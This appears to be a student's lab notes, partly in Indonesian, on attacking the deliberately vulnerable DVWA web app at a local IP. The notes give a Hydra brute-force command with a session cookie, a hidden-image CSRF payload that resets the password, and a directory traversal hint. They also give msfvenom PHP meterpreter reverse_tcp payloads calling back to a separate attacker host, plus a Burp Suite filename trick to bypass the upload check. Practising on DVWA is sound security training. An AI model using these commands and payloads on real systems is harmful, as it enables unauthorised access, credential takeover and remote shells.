# Web Hacking
## Target
- IP 192.168.43.61
- Website target : http://192.168.43.61/DVWA
## 1. Brute Force using Hydra
- > Download link : https://github.com/vanhauser-thc/thc-hydra
- > Intercept http://192.168.43.61/DVWA/vulnerabilities/brute/
- > ```hydra 192.168.43.61 -l admin -P ~/HackingTools/passlist.txt http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low;PHPSESSID=agtsveq2le4sv22ht3kcsmhv0q" ```

## 2. Exploit CSRF Vulnerability
- > Buat file html, copy 
    > ``` <img style="display:none" src="http://192.168.43.61/DVWA/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change" alt=""> ```
## 3. Directory Traversal
- > buka http://192.168.43.61/DVWA/vulnerabilities/fi/?page=file1.php
- > coba akses file pada server dengan memanfaatkan celah akses directory 
## 4. File Injection
> Tools : Metasploit, Burpsuite
- ### LOW Security
    - ```msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.241 LPORT=3333 -o upload.php```
    - > Upload file 'upload.php' ke http://192.168.43.61/DVWA/vulnerabilities/upload/
    - ```run msfconsole```
    - ```use multi/handler```
    - ```set lhost [IP lhost samakan dengan payload]```
    - ```set lport [lport samakan dengan payload]```
    - ```run```
- ### Medium Security
    - ```msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.241 LPORT=4444 -o koala.php```
    - > Ganti nama koala.php menjadi koala.php.jpeg
    - > Buka Burpsuite > proxy > intercept > intercept on
    - > Upload file 'koala.php.jpeg' ke http://192.168.43.61/DVWA/vulnerabilities/upload/
    - > pada payload burpsuite rubah nama file koala.php.jpeg menjadi koala.php
    - ```run msfconsole```
    - ```use multi/handler```
    - ```set lhost [IP lhost samakan dengan payload]```
    - ```set lport [lport samakan dengan payload]```
    - ```run```